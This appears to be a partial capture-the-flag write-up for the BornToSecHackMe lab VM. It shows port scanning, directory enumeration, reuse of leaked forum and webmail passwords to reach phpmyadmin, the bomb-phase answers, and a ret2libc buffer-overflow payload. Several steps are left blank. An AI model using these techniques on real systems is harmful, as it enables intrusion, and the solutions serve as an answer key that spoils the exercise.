# Writeup 1

## Step 1 - Nmap

Scan ports with :
```bash
sudo nmap -sn localhost/24
```
Thats gives us the ip of the vm :
```bash
Nmap scan report for BornToSecHackMe (192.168.1.21)
Host is up (0.0083s latency).
Not shown: 994 closed ports
PORT    STATE         SERVICE
21/tcp  open|filtered ftp
22/tcp  open|filtered ssh
80/tcp  open|filtered http
143/tcp open|filtered imap
443/tcp open|filtered https
993/tcp open|filtered imaps
MAC Address: 08:00:27:C8:08:7C (Oracle VirtualBox virtual NIC)
```

---

## Step 2 - Dirb

We then checked the https://192.168.1.21

We used dirb to test all urls and we found out some interesting ones:
```bash
https://192.168.1.21/forum
https://192.168.1.21/phpmyadmin
https://192.168.1.21/webmail
```

---

## Step 3 - Forum

We checked the logs in the "Probleme login ?" section in the https://192.168.1.21/forum  
Saw user **lmezard** login with password :
```bash
!q\]Ej?*5K5cy*AJ
```
And we logged in on the forum with these logs

---

## Step 4 - Webmail
We got the user mail on the profile and logged in on https://192.168.1.21/webmail with that email and the same password.  
In the mailbox there is a mail with a root user and a password:
```bash
Fg-'kKXBj87E:aJ$
```

---

## Step 5 - Phpmyadmin

Then we logged on https://192.168.1.21/phpmyadmin with root as user and the password as above.  
And we accessed to the data base : in which we clicked on "forum_db" and "mlf2_userdata" to change user_type for user "lmezard" to "2" as it is set for admin user.

-> SQL query, and /templates_c

---

## Step 6 - User www-data


---

## Step 7 - FTP


---

## Step 8 - Laurie / The Bomb

```
PHASE 1: Public speaking is very easy.
PHASE 2: 1 2 6 24 120 720
PHASE 3: 1 b 214
PHASE 4: 9
PHASE 5: opekmq / opekma
PHASE 6: 4 2 6 3 1 5

Publicspeakingisveryeasy.126241207201b2149opekmq426315
```

This password doesn't work and we need to change `n-1` with `n-2`, so the password is `Publicspeakingisveryeasy.126241207201b2149opekmq426135`

---

## Step 9 - Thor / Turtle




---

## Step 10 - Zaz / Exploit-me


https://wiremask.eu/tools/buffer-overflow-pattern-generator/?

```
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) find 0xb7e6b060, +9999999, "/bin/sh"
0xb7f8cc58

```

```
zaz@BornToSecHackMe:~$ python -c 'print "A"*140 + "\x60\xb0\xe6\xb7" + "AAAA" + "\x58\xcc\xf8\xb7"' > test
zaz@BornToSecHackMe:~$ ./exploit_me $(cat test)
```
